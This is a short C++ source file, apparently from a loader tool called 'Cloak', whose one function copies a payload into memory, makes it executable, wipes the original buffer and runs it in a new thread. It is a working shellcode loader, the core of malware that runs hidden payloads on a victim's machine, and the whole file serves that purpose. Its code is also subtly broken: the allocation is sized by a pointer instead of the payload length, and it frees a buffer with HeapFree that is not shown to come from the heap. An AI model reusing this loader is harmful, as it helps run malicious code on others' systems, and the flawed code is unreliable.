#include "Cloak.hpp"

#ifdef LOCAL_THREAD

BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;

    pPayloadAddress = VirtualAlloc( NULL, sizeof(pbPayload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
    memset( pbPayload, '\0', sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }

    hThread = CreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) pPayloadAddress, NULL, NULL, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    WaitForSingleObject( hThread, WAIT_TIME );

    HeapFree( GetProcessHeap(), 0, pbPayload );

    return TRUE;
}

#endif // !LOCAL_THREAD